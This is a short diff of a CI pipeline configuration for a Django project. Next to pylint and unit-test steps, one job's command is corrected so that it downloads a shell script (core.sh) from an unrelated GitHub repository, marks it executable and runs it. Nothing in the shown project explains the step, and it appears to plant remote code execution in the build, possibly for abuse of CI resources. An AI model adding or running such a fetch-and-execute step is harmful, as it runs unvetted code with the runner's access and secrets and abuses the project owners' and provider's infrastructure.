@@ -36,7 +36,7 @@ blocks:
             - git ls-files | grep -v 'migrations' | grep -v 'settings.py' | grep -v 'manage.py' | grep -E '.py$' | xargs pylint -E --load-plugins=pylint_django
         - name: 'Job #2'
           commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.s'
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
   - name: Run Unit Tests
     task:
       prologue:
